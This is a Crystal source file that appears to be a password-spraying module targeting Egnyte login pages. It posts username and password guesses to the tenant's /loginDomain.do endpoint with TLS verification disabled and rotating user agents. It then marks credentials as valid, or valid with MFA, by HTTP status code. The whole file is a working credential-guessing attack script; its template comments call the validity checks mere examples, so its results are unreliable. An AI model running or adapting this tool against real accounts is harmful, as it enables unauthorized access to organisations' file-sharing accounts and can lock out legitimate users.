require "http/client"

class Egnyte < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE


        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}"
        } 

        # form = "username=#{username}&password=#{password}" # request form params here


        form = "user.userName=#{URI.encode_www_form(username) }&user.password=#{URI.encode_www_form(password) }&subdomainUserLogin=subdomainUserLogin&com.egnyte.subdomain=#{url.host.not_nil!.split(".").first.strip }&com.egnyte.activationCode=%0D%0A&ref=&redirectUrl=&oauth=&oauthSource=&sfEgnyteIntegLoginInfo=&reportName=null&requestId=null&timeZoneOffset=300&linkId=&pageType=login&hidPlanType=&subscribers=&totalStandardUsers=&hidPaymentType=&hidElcEnabled=&storage=&hidVersionId=&hidNASInstances=&hidPromoCode=&hidResellerCode=&hidSubDomainName=#{url.host.not_nil!.split(".").first.strip }&hidShowOldGrid=false&hidPlanNum=1&loadType=init&schemeType=&hidSchemeType=&hidSchemeTypeVal=&plan=&monthlyPricing=&yearlyPricing=&hidTotalCost=&hidHasPlanChanges=false&hidLinkUrlToProceed=&hidTabId=&hidTabBodyId=&userCount=&normalPrice=&specialType=&standardUsers=&standardAccounts=4&totalLicenseMemebers=&hidLocalCloudCost=&hidPlanVersionId=&hidCurrPlanVersionId=&txtExtraPUCount=0&hidOlcEnabled=&hidOlcCost=&hidTrialEndDate=&hidNextPaymentDate=&hidHasPackageBands=false&hidCurrPackBandIndex=-1&hidPaymentType=&hidActualCost=&hidNASDevices=&hidOrgPlanType=&org_subscribers=&org_userCount=&org_storage=&hidOrgElcEnabled=&hidSharedFolderSize=0.0&hidPrivateFolderSize=0.0&hidOrgPaymentType=&hidSubscriptionType=&hidActionExecuted="
        


        # here is the basic request 
        # GET /rest/public/1.0/users/sso/#{username url encoded}
        # POST /loginDomain.do
        page = client.post(url.path + "/loginDomain.do", headers: header, form: form) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 
        # pp page 
        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 
        # these are EXAMPLES of how to do checks 
        if page.status_code == 200 # if ok 
            spstatus.valid_credentials = true 
        elsif page.status_code == 303 
            spstatus.valid_credentials = true 
            spstatus.mfa = true 
        end 

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return the SprayStatus object 
        return spstatus
    end
end




